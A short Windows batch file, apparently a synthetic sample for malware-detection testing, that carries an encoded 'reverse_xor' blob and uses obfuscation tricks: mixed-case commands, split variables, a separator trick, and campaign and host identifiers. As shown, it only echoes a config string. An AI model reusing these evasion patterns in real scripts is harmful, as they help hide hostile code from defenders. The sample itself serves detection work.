@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|reverse_xor
rem HUNTRESS-MATERIAL:==QROIwTAdkVDBkDXZFUcdlVsBFXdVlWUZUQSdkWc11HBZ1RGFUXsBFXdVlWUZUQSdkWc11TSdlUDdkVB5AUS91XPB0RSRlVsBFXG11ROIwTUFkUDtlDApVXU9lVP1lVLdEbfJVXUZkUUZlDdxVXW9EUS51QSpFVdxmWX5AUS51QSpFVd5xBWB1ADAlCBYlUPtFXAdEbadlDbxFQH5xBWB1ADAlCBYlU
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "h0=v=1|steps=decode_configuration,return_conf"
SeT "h1=iguration|adapter=call|stage_count=1|graph"
SeT "h2==single|next_language=none|campaign_id=cam"
SeT "h3=paign-4ec00c92ea|host_id=host-4ec00c92ea"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=0ee00fa8"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "cfg="
for %%G in (0 1 2 3) do call set "cfg=%%cfg%%%%h%%G%%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo set HUNTRESS_HOST=host-4ec00c92ea
exit /b 0
